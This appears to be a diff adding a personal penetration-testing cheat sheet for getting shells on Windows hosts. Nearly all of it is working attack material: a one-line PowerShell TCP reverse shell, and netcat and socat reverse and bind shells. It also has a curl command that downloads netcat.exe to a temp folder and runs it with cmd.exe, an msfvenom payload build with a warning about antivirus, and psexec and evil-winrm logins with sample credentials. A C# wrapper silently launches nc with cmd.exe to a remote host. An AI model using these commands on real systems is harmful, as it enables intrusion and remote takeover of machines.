@@ -1,0 +1,76 @@
+### win rhsell ###
+## links
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+################
+## powershell ##
+################
+# rshell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.98.114',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# connect (config need to be done on target and attacker)
+PS> Enable-PSRemoting										# as admin
+PS> Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80					# target as trusted
+PS> Invoke-Command -ComputerName 192.168.50.80 -Scriptblock { ipconfig } -Credential offensive	# co & exec ipconfig
+PS> Enter-PSSession -ComputerName 192.168.50.80 -Credential offensive				# interactiv shell
+
+
+############
+## psexec ##
+############
+# Need system has open File and Printer Sharing
+psexec \\192.168.50.80 -u offensive -p security ipconfig					# -i for 2.32
+psexec \\192.168.50.80 -u offensive -p security -i ipconfig					# exec ipconfig
+psexec \\192.168.50.80 -u offensive -p security -i cmd						# interactiv shell
+
+
+################
+## evil-winrm ##
+################
+# host must be configured for PSRemoting and WinRM that runs on port 5985
+evil-winrm -i 192.168.50.80 -u offensive -p security						# remote co
+
+
+############
+## rshell ##
+############
+# netcat
+curl http://IP/netcat.exe -o c:\\windows\\temp\\netcat.exe
+powershell.exe c:\\windows\\temp\\netcat.exe IP PORT -e cmd.exe
+# rshell
+nc 10.8.98.114 4444 -e "cmd.exe"
+# bshell
+nc -nvlp 4444 -e "cmd.exe"
+# listen
+nc -nvlp 4444
+rlwrap nc -lvnp 4444
+
+# msfvenom ,be careful of AV
+msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=IP LPORT=PORT
+
+# rshell
+socat TCP:10.8.98.114:4444 EXEC:powershell.exe,pipes
+# bshell
+socat TCP-L:4444 EXEC:powershell.exe,pipes
+# listen
+socat TCP-L:4444 -
+
+
+## csharp
+# wrapper
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            Process proc = new Process();
+            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-leopoldine.exe", "10.50.55.186 443 -e cmd.exe");
+            procInfo.CreateNoWindow = true;
+            proc.StartInfo = procInfo;
+            proc.Start();
+        }
+    }
+}
+
+> mcs Wrapper.cs						# compile with mono
